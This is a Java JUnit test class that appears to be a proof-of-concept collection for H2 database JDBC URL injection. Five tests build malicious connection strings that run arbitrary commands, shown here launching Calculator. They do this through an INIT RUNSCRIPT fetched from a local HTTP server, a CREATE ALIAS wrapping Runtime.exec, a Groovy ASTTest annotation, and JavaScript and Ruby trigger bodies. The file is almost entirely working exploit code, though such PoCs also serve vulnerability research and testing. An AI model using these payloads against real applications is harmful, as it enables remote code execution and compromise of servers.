package com.trganda.poc;

import org.junit.jupiter.api.Test;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Poc {
    @Test
    public void runScript() throws SQLException {
        String payload = "INIT=RUNSCRIPT FROM 'http://127.0.0.1:8001/poc.sql'";
        String connectionUrl = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;" + payload;

        Connection connection = DriverManager.getConnection(connectionUrl, "sa", "");
        connection.close();
    }

    @Test
    public void crateAlias() throws SQLException {
        String payload =
                "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"trganda\"\\;}'\\;CALL EXEC ('open -a Calculator.app')";

        String connectionUrl = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;" + payload;

        Connection connection = DriverManager.getConnection(connectionUrl, "sa", "");
        connection.close();
    }

    @Test
    public void groovyAsset() throws SQLException {
        String groovy =
                "@groovy.transform.ASTTest(value={"
                        + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")"
                        + "})"
                        + "def x";
        String url =
                "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS T5 AS '"
                        + groovy
                        + "'";

        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }

    @Test
    public void js() throws SQLException {
        String javascript =
                "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";

        // work on old h2 version
        // String oldUrl =
        //            "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;MODE=MSSQLServer;INIT=CREATE
        // TRIGGER POC BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"
        //                + javascript
        //                + "'";

        String url =
                "jdbc:h2:mem:db;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE SCHEMA IF NOT EXISTS db\\;CREATE TABLE db.TEST(ID INT PRIMARY KEY, NAME VARCHAR(255))\\;CREATE TRIGGER POC BEFORE SELECT ON db.TEST AS '"
                        + javascript
                        + "'";

        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }

    @Test
    public void ruby() throws SQLException {
        String ruby =
                "#ruby\nrequire \"java\"\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
        String url =
                "jdbc:h2:mem:db;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE SCHEMA IF NOT EXISTS db\\;CREATE TABLE db.TEST(ID INT PRIMARY KEY, NAME VARCHAR(255))\\;CREATE TRIGGER POC BEFORE SELECT ON db.TEST AS '"
                        + ruby
                        + "'";

        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }
}
